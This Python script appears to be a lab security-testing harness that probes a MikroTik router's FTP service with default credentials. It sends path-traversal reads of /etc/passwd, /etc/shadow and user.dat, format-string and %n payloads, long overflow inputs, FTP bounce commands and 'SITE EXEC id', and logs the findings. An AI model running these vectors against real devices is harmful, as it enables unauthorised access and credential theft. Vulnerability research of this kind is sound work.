#!/usr/bin/env python3
"""
MikroTik FTP Re-Test Script — Per-test connection management.

Addresses the issue from attack_ftpd.py where broken pipe errors cascaded
after the FTP server dropped a connection. Each test creates a FRESH
authenticated FTP session.

Focus: Tests that got Broken pipe in the initial run.
Target: [REDACTED-INTERNAL-IP] (pristine MikroTik CHR 7.20.8)
"""

import ftplib
import json
import os
import socket
import sys
import time
import requests
from datetime import datetime

TARGET = "[REDACTED-INTERNAL-IP]"
FTP_PORT = 21
ADMIN_USER = "admin"
ADMIN_PASS = "admin"

tests = []
findings = []
anomalies = []
test_count = 0
anomaly_count = 0


def log(msg):
    print(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}", flush=True)


def check_router_alive():
    """Check router health via REST API."""
    try:
        r = requests.get(f"http://{TARGET}/rest/system/resource",
                         auth=(ADMIN_USER, ADMIN_PASS), timeout=5)
        if r.status_code == 200:
            d = r.json()
            return True, d.get("uptime", "?"), d.get("version", "?")
    except:
        pass
    return False, None, None


def ftp_connect_auth(timeout=10):
    """Create a fresh authenticated FTP connection. Returns (ftp, error)."""
    try:
        ftp = ftplib.FTP()
        ftp.connect(TARGET, FTP_PORT, timeout=timeout)
        ftp.login(ADMIN_USER, ADMIN_PASS)
        return ftp, None
    except Exception as e:
        return None, str(e)


def raw_ftp_cmd(cmd, timeout=5):
    """Send a raw FTP command on a fresh connection. Returns (response, error)."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((TARGET, FTP_PORT))
        # Read banner
        banner = s.recv(4096).decode('utf-8', errors='replace').strip()
        if not banner:
            s.close()
            return None, "empty_banner"
        # Login
        s.sendall(b"USER " + ADMIN_USER.encode() + b"\r\n")
        time.sleep(0.3)
        s.recv(4096)
        s.sendall(b"PASS " + ADMIN_PASS.encode() + b"\r\n")
        time.sleep(0.3)
        resp = s.recv(4096).decode('utf-8', errors='replace').strip()
        if not resp.startswith("230"):
            s.close()
            return None, f"login_failed: {resp}"
        # Send command
        s.sendall(cmd.encode() + b"\r\n")
        time.sleep(0.5)
        try:
            resp = s.recv(4096).decode('utf-8', errors='replace').strip()
        except socket.timeout:
            resp = "TIMEOUT"
        s.close()
        return resp, None
    except Exception as e:
        return None, str(e)


def add_test(name, result, details=None, category="general"):
    global test_count
    test_count += 1
    entry = {"test": name, "result": result, "category": category}
    if details:
        entry["details"] = details
    tests.append(entry)
    marker = "✓" if result == "pass" else "⚠ ANOMALY" if result == "anomaly" else "✗"
    log(f"  [{marker}] {name}: {json.dumps(details)[:200] if details else result}")


def add_finding(severity, title, description, evidence=None):
    finding = {"severity": severity, "title": title, "description": description}
    if evidence:
        finding["evidence"] = evidence
    findings.append(finding)
    log(f"  🔴 FINDING [{severity}]: {title}")


def main():
    log(f"MikroTik FTP Re-Test — Target: {TARGET}:{FTP_PORT}")
    log("Each test uses a fresh connection to prevent broken pipe cascade")
    log("=" * 60)

    alive, uptime, version = check_router_alive()
    log(f"Router: alive={alive}, uptime={uptime}, version={version}")

    if not alive:
        log("ERROR: Router not reachable")
        sys.exit(1)

    initial_uptime = uptime

    # =================================================================
    # Test 0: Basic FTP connectivity
    # =================================================================
    log("\n--- Basic FTP Connectivity ---")
    ftp, err = ftp_connect_auth()
    if ftp:
        try:
            pwd = ftp.pwd()
            syst = ftp.sendcmd("SYST")
            add_test("basic_login", "pass", {"pwd": pwd, "syst": syst}, "connectivity")
            ftp.quit()
        except Exception as e:
            add_test("basic_login", "anomaly", {"error": str(e)}, "connectivity")
    else:
        add_test("basic_login", "fail", {"error": err}, "connectivity")
        add_finding("HIGH", "FTP service unresponsive to authenticated sessions",
                     f"Fresh FTP connection fails with: {err}. Service may be degraded.",
                     {"error": err, "uptime": uptime})
        # Can't continue if FTP is down
        log("FTP service appears down — saving evidence and exiting")
        save_evidence(initial_uptime)
        return

    # =================================================================
    # Section 1: Path Traversal (fresh connection per test)
    # =================================================================
    log("\n--- Path Traversal Tests (per-connection) ---")
    traversal_vectors = [
        ("CWD ../../etc", "cwd_basic_traversal"),
        ("CWD ../../../../../etc/passwd", "cwd_deep_traversal"),
        ("CWD /etc/passwd", "cwd_absolute"),
        ("CWD /", "cwd_root"),
        ("CWD ./../../../", "cwd_mixed"),
        ("RETR ../../etc/passwd", "retr_etc_passwd"),
        ("RETR /etc/passwd", "retr_absolute"),
        ("RETR ../../etc/shadow", "retr_etc_shadow"),
        ("RETR ../flash/rw/store/user.dat", "retr_userdat_traversal"),
        ("RETR ../../../../../flash/rw/store/user.dat", "retr_cve2019_3943"),
        ("STOR ../../tmp/ftp_test_write", "stor_traversal"),
        ("LIST ../../etc", "list_traversal"),
        ("SIZE ../../etc/passwd", "size_traversal"),
        ("CWD %2e%2e%2f%2e%2e%2f", "cwd_url_encoded"),
        ("CWD %252e%252e%252f", "cwd_double_encoded"),
        ("CWD ..%c0%af..%c0%af", "cwd_unicode_overlong"),
        ("CWD ..\\..\\", "cwd_backslash"),
        ("RETR ../../etc/passwd%00.txt", "retr_null_byte"),
    ]

    for cmd, name in traversal_vectors:
        resp, err = raw_ftp_cmd(cmd)
        if err:
            if err == "empty_banner":
                add_test(f"traversal_{name}", "anomaly",
                         {"error": "FTP returned empty banner", "cmd": cmd}, "path_traversal")
                anomalies.append({"test": name, "issue": "empty_banner"})
                continue
            add_test(f"traversal_{name}", "pass", {"cmd": cmd, "error": err}, "path_traversal")
        else:
            # Check if we got file content (traversal success = vulnerability)
            traversal_success = False
            if resp and any(x in resp.lower() for x in ["root:", "daemon:", "bin/sh", "password"]):
                traversal_success = True
                add_finding("CRITICAL", f"Path traversal via FTP: {cmd}",
                            f"FTP command '{cmd}' returned sensitive file content",
                            {"cmd": cmd, "response": resp[:500]})

            result = "anomaly" if traversal_success else "pass"
            add_test(f"traversal_{name}", result,
                     {"cmd": cmd, "response": resp[:300] if resp else "EMPTY",
                      "traversal_success": traversal_success}, "path_traversal")

    # =================================================================
    # Section 2: Format String in FTP commands
    # =================================================================
    log("\n--- Format String Tests (per-connection) ---")
    fmtstr_cmds = [
        ("CWD %x.%x.%x.%x.%x.%x.%x.%x", "cwd_hex"),
        ("CWD %p.%p.%p.%p.%p.%p.%p.%p", "cwd_ptr"),
        ("CWD %s%s%s%s", "cwd_str"),
        ("RETR %x.%x.%x.%x", "retr_hex"),
        ("MKD %x.%x.%x.%x", "mkd_hex"),
        ("DELE %x.%x.%x.%x", "dele_hex"),
        ("SIZE %x.%x.%x.%x", "size_hex"),
        ("LIST %x.%x.%x.%x", "list_hex"),
        ("RNFR %x.%x.%x.%x", "rnfr_hex"),
        ("RNTO %x.%x.%x.%x", "rnto_hex"),
        ("PORT %x,%x,%x,%x,%x,%x", "port_hex"),
        ("REST %x%x%x%x", "rest_hex"),
        ("CWD %n%n%n%n", "cwd_write_n"),
        ("RETR %n%n%n%n", "retr_write_n"),
        ("STOR %n%n%n%n", "stor_write_n"),
    ]

    for cmd, name in fmtstr_cmds:
        # Check health before %n tests
        if "%n" in cmd:
            alive, up, _ = check_router_alive()
            if not alive:
                add_finding("CRITICAL", "Router crashed during format string testing",
                            "Router became unresponsive during format string tests")
                break

        resp, err = raw_ftp_cmd(cmd)
        # Check if format string was processed (hex values in response)
        processed = False
        if resp:
            # If we see hex digits where we sent %x, format string was processed
            import re
            if re.search(r'[0-9a-f]{4,8}\.[0-9a-f]{4,8}', resp.lower()):
                processed = True
                add_finding("CRITICAL", f"Format string processed in FTP: {cmd}",
                            f"FTP command '{cmd}' caused format string expansion",
                            {"cmd": cmd, "response": resp[:500]})

        add_test(f"fmtstr_{name}", "anomaly" if processed else "pass",
                 {"cmd": cmd, "response": resp[:300] if resp else str(err),
                  "processed": processed}, "format_string")

        # Check router health after %n
        if "%n" in cmd:
            time.sleep(1)
            alive, up, _ = check_router_alive()
            if not alive:
                add_finding("CRITICAL", f"Router crashed after FTP format string: {cmd}",
                            "Format string %n may have caused memory corruption + crash",
                            {"cmd": cmd, "pre_uptime": uptime})
                break

    # =================================================================
    # Section 3: isSensitiveFile bypass
    # =================================================================
    log("\n--- Sensitive File Access Tests (per-connection) ---")
    sensitive_paths = [
        "user.dat", "User.Dat", "USER.DAT",
        "/flash/rw/store/user.dat", "user.dat%00.txt",
        "/flash/nova/etc/devel-login", "/flash/rw/RESET",
        "../flash/rw/store/user.dat", "./user.dat",
    ]

    for path in sensitive_paths:
        resp, err = raw_ftp_cmd(f"RETR {path}")
        leaked = False
        if resp and any(x in resp for x in ["admin", "password", "user", "hash"]):
            if "553" not in resp and "550" not in resp:  # not error codes
                leaked = True
                add_finding("CRITICAL", f"Sensitive file leaked via FTP: {path}",
                            f"RETR {path} returned sensitive content",
                            {"path": path, "response": resp[:500]})

        add_test(f"sensitive_{path[:40]}", "anomaly" if leaked else "pass",
                 {"path": path, "response": resp[:200] if resp else str(err),
                  "leaked": leaked}, "sensitive_file")

    # =================================================================
    # Section 4: SIZE overflow (this is where the original broke)
    # =================================================================
    log("\n--- SIZE Command Tests (per-connection) ---")
    for size in [256, 512, 1024, 4096, 8192]:
        payload = "A" * size
        resp, err = raw_ftp_cmd(f"SIZE {payload}")
        add_test(f"size_overflow_{size}B", "pass",
                 {"size": size, "response": resp[:200] if resp else str(err)}, "size_overflow")

    # =================================================================
    # Section 5: FTP Bounce / PORT
    # =================================================================
    log("\n--- FTP Bounce Tests (per-connection) ---")
    bounce_targets = [
        ("PORT 127,0,0,1,0,80", "bounce_loopback_http"),
        ("PORT 127,0,0,1,0,22", "bounce_loopback_ssh"),
        ("PORT 127,0,0,1,0,21", "bounce_loopback_ftp"),
        ("PORT 10,0,0,1,0,80", "bounce_gateway_http"),
        ("PORT 0,0,0,0,0,80", "bounce_any"),
        (f"EPRT |1|127.0.0.1|80|", "eprt_loopback"),
        (f"EPRT |2|::1|80|", "eprt_ipv6_loopback"),
    ]

    for cmd, name in bounce_targets:
        resp, err = raw_ftp_cmd(cmd)
        # Check if PORT was accepted (200 response = bounce possible)
        accepted = resp and resp.startswith("200") if resp else False
        if accepted:
            add_finding("MEDIUM", f"FTP bounce accepted: {cmd}",
                        "Server accepted PORT/EPRT to internal network",
                        {"cmd": cmd, "response": resp})
        add_test(f"bounce_{name}", "anomaly" if accepted else "pass",
                 {"cmd": cmd, "response": resp[:200] if resp else str(err),
                  "accepted": accepted}, "ftp_bounce")

    # =================================================================
    # Section 6: Command injection edge cases
    # =================================================================
    log("\n--- Edge Case Tests (per-connection) ---")
    edge_cases = [
        ("SITE HELP", "site_help"),
        ("SITE EXEC id", "site_exec"),
        ("TYPE A", "type_ascii"),
        ("TYPE I", "type_binary"),
        ("STRU F", "stru_file"),
        ("MODE S", "mode_stream"),
        ("REST 0", "rest_zero"),
        ("REST -1", "rest_negative"),
        ("REST 4294967295", "rest_uint32_max"),
        ("REST 99999999999999999", "rest_huge"),
        ("ABOR", "abor"),
        ("FEAT", "feat"),
        ("MLST", "mlst"),
        ("NOOP", "noop"),
    ]

    for cmd, name in edge_cases:
        resp, err = raw_ftp_cmd(cmd)
        add_test(f"edge_{name}", "pass",
                 {"cmd": cmd, "response": resp[:200] if resp else str(err)}, "edge_case")

    # =================================================================
    # Section 7: PASV/EPSV data connection
    # =================================================================
    log("\n--- Data Connection Tests (per-connection) ---")
    for cmd in ["PASV", "EPSV"]:
        resp, err = raw_ftp_cmd(cmd)
        if resp:
            # Parse PASV response for internal IP leak
            import re
            m = re.search(r'(\d+),(\d+),(\d+),(\d+),(\d+),(\d+)', resp)
            if m:
                ip = f"{m.group(1)}.{m.group(2)}.{m.group(3)}.{m.group(4)}"
                port = int(m.group(5)) * 256 + int(m.group(6))
                add_test(f"data_{cmd.lower()}", "pass",
                         {"cmd": cmd, "response": resp, "ip": ip, "port": port}, "data_connection")
                if ip.startswith("127.") or ip.startswith("0."):
                    add_finding("LOW", f"{cmd} returns internal IP",
                                f"{cmd} response contains internal address {ip}:{port}",
                                {"ip": ip, "port": port})
            else:
                add_test(f"data_{cmd.lower()}", "pass",
                         {"cmd": cmd, "response": resp[:200]}, "data_connection")
        else:
            add_test(f"data_{cmd.lower()}", "pass",
                     {"cmd": cmd, "error": str(err)}, "data_connection")

    # =================================================================
    # Final health check
    # =================================================================
    log("\n--- Final Health Check ---")
    alive, final_uptime, _ = check_router_alive()
    if not alive:
        add_finding("HIGH", "Router unresponsive after FTP re-tests",
                     "Router became unresponsive during testing")
    elif initial_uptime and final_uptime and initial_uptime > final_uptime:
        add_finding("HIGH", "Router rebooted during FTP re-tests",
                     f"Uptime decreased: {initial_uptime} → {final_uptime}")

    add_test("final_health", "pass" if alive else "fail",
             {"alive": alive, "initial_uptime": initial_uptime, "final_uptime": final_uptime},
             "health")

    save_evidence(initial_uptime)


def save_evidence(initial_uptime):
    evidence = {
        "metadata": {
            "script": "attack_ftpd_retest.py",
            "target": TARGET,
            "timestamp": datetime.now().isoformat(),
            "initial_uptime": initial_uptime,
            "description": "FTP re-test with per-connection management",
        },
        "tests": tests,
        "findings": findings,
        "anomalies": anomalies,
        "summary": {
            "total_tests": test_count,
            "total_anomalies": anomaly_count,
            "total_findings": len(findings),
        },
    }

    out_path = "/home/[REDACTED]/Desktop/[REDACTED-PATH]/MikroTik/evidence/attack_ftpd_retest.json"
    os.makedirs(os.path.dirname(out_path), exist_ok=True)
    with open(out_path, "w") as f:
        json.dump(evidence, f, indent=2, default=str)

    log(f"\nEvidence saved to {out_path}")
    log(f"Complete: {test_count} tests, {anomaly_count} anomalies, {len(findings)} findings")
    if findings:
        log("\nFINDINGS SUMMARY:")
        for f_ in findings:
            log(f"  [{f_['severity']}] {f_['title']}")


if __name__ == "__main__":
    main()
